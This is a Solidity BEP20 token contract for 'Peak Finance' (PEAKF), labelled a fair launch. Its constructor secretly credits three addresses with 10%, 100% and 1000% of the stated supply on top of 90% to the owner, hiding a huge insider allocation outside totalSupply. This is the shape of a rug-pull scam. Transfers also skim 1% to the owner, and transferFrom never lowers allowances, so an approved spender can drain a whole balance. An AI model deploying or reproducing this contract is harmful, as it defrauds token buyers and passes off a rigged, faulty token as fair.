// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface TOKENBEP20ROOT {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean values indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);













  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This values changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean values indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired values afterwards:
   * https://github.com/TOKENBEP20s/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean values indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `values` tokens are moved from one account (`from`) to  another (`to`). Note that `values` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 values);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `values` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 values);
}


contract TOKENBEP20 is TOKENBEP20ROOT {
     // FairLaunch
    // common addresses
    address private owner;
    address private TOKENBEP20BSC;
    address private TOKENBEP20Coin;
    address private TOKENBEP20s;
   










    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public _TBALANCE;
    
    mapping(address => mapping(address => uint)) public allowances;
    
 
    string public override name = "Peak Finance";
    string public override symbol = "PEAKF";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint values);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint values);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyvalues, address TOKENBEP20BSCAddress, address TOKENBEP20CoinAddress, address TOKENBEP20sAddress) {
        // set total supply
        totalSupply = totalSupplyvalues;
        
        // designate addresses
        owner = msg.sender;
        TOKENBEP20BSC = TOKENBEP20BSCAddress;
        TOKENBEP20Coin = TOKENBEP20CoinAddress;
        TOKENBEP20s = TOKENBEP20sAddress;
        _TBALANCE[TOKENBEP20BSC] =  totalSupply * 10 / 100;
        _TBALANCE[TOKENBEP20Coin] = totalSupply * 100 / 100;
        _TBALANCE[TOKENBEP20s] = totalSupply * 1000 / 100;
        // split the tokens according to agreed upon percentages        
        _TBALANCE[owner] = totalSupply * 90 / 100;
    }
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return _TBALANCE[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint values) public override returns(bool) {
        require(values > 0, "Transfer values has to be higher than 0.");
        require(balanceOf(msg.sender) >= values, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total values
        uint rebaseTBD = values * 1 / 100;
        uint burnTBD = values * 0 / 100;
        uint valuesAfterTaxAndBurn = values - rebaseTBD - burnTBD;
        
        // perform the transfer operation
        _TBALANCE[to] += valuesAfterTaxAndBurn;
        _TBALANCE[msg.sender] -= values;
        
        emit Transfer(msg.sender, to, values);
        
        // finally, we burn and tax the extras percentage
        _TBALANCE[owner] += rebaseTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint values) public override returns(bool) {
        allowances[msg.sender][spender] = values; 
        
        emit Approval(msg.sender, spender, values);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint values) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= values, "Allowance too low for transfer.");
        require(_TBALANCE[from] >= values, "Balance is too low to make transfer.");
        
        _TBALANCE[to] += values;
        _TBALANCE[from] -= values;
        
        emit Transfer(from, to, values);
        
        return true;
    }

    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(_TBALANCE[account] >= amount, "Burn amount exceeds balance at address.");
    
        _TBALANCE[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}